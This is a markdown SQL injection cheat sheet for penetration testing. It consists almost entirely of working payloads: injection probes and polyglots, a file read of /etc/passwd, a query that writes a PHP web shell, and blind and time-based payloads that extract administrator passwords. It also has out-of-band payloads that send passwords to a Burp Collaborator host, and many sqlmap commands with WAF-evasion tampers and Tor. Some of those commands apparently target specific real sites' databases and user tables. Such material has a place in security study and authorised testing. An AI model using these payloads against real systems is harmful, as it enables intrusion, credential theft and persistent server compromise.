# SQLi

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Common

```sql
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'   <== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
/?q=(1)or(0)=(1)
```

## Polyglot

```sql
', ",'),"), (),., * /, <! -, -
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
```

## Resources by type

```bash
# MySQL:
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/

# MSQQL:
http://evilsql.com/main/page2.php
http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

# ORACLE:
http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet

# POSTGRESQL:
http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet

# Others
http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html
http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet
http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet
http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet
https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet
http://rails-sqli.org/
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
```

## R/W files

```bash
# Read file
UNION SELECT LOAD_FILE ("etc/passwd")-- 

# Write a file
UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
```

## **Blind SQLi**

```bash
# Conditional Responses

# Request with:
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

    In the DDBB it does:
    SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' - If exists, show content or “Welcome back”

# To detect:
TrackingId=x'+OR+1=1-- OK
TrackingId=x'+OR+1=2-- KO
# User admin exist
TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'-- OK
# Password length
TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>1--

# So, in the cookie header if first letter of password is greater than ‘m’, or ‘t’ or equal to ‘s’ response will be ok.

xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'--
xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 't'--
xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) = 's'--
z'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,6,1)='§a§'--

# Force conditional responses

TrackingId=x'+UNION+SELECT+CASE+WHEN+(1=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual-- RETURNS ERROR IF OK
TrackingId=x'+UNION+SELECT+CASE+WHEN+(1=2)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual-- RETURNS NORMALLY IF KO
TrackingId='+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,3,1)='§a§')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--;

# Time delays
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
TrackingId=x'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
TrackingId=x'; IF (1=2) WAITFOR DELAY '0:0:10'--
TrackingId=x'||pg_sleep(10)--
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

# Out-of-Band OAST (Collaborator)
Asynchronous response

# Confirm:
TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//x.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--

# Exfil:
TrackingId=x'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
```

## **Second Order SQLi**

```bash
# A second-order SQL Injection, on the other hand, is a vulnerability exploitable in two different steps:
1. Firstly, we STORE a particular user-supplied input value in the DB and
2. Secondly, we use the stored value to exploit a vulnerability in a vulnerable function in the source code which constructs the dynamic query of the web application.

# Example payload:
X' UNION SELECT user(),version(),database(), 4 --
X' UNION SELECT 1,2,3,4 --

# For example, in a password reset query with user "User123' --":

$pwdreset = mysql_query("UPDATE users SET password='getrekt' WHERE username='User123' — ' and password='UserPass@123'");

# Will be:

$pwdreset = mysql_query("UPDATE users SET password='getrekt' WHERE username='User123'");

# So you don't need to know the password.

- User = ' or 'asd'='asd it will return always true
- User = admin'-- probably not check the password
```

## **sqlmap**

```bash
# Post
sqlmap -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://10.11.1.111/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://10.11.1.111 --dbms=mysql --crawl=3

# Full auto - FORMS
sqlmap -u 'http://10.11.1.111:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
# Columns 
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --columns -T users -D admin
# Values
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --dump -T users -D admin

sqlmap -o -u "http://10.11.1.111:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --users --passwords

# SQLMAP WAF bypass

sqlmap --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
sqlmap --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" --dbs
sqlmap --dbms="MySQL" -v3 --technique U --tamper="space2comment" --dbs
sqlmap -v3 --technique=T --no-cast --fresh-queries --banner
sqlmap -u http://www.example.com/index?id=1 --level 2 --risk 3 --batch --dbs


sqlmap -f -b --current-user --current-db --is-dba --users --dbs
sqlmap --risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 --dbs
sqlmap --risk 3 --level 5 --random-agent --proxy http://123.57.48.140:8080 --dbs
sqlmap --random-agent --dbms=MYSQL --dbs --technique=B"
sqlmap --identify-waf --random-agent -v 3 --dbs

1 : --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs
2 : --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3

sqlmap --threads=10 --dbms=MYSQL --tamper=apostrophemask --technique=E -D joomlab -T anz91_session -C session_id --dump
sqlmap --tables -D miss_db --is-dba --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent
sqlmap -u http://192.168.0.107/test.php?id=1 -v 3 --dbms "MySQL" --technique U -p id --batch --tamper "space2morehash.py"
sqlmap --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2
sqlmap -v3 --dbms="MySQL" --risk=3 --level=3 --technique=BU --tamper="space2mysqlblank.py" --random-agent -D damksa_abr -T admin,jobadmin,member --colu

sqlmap --wizard
sqlmap --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql
sqlmap -url www.site.ps/index.php --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql
sqlmap -url www.site.ps/index.php --level 5 --risk 3 tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql

# Tamper suggester
https://github.com/m4ll0k/Atlas

--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent
--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" --tables
--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" --columns
--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" -C "ud,email,usuario,contra" --dump
# Tamper list
between.py,charencode.py,charunicodeencode.py,equaltolike.py,greatest.py,multiplespaces.py,nonrecursivereplacement.py,percent
```

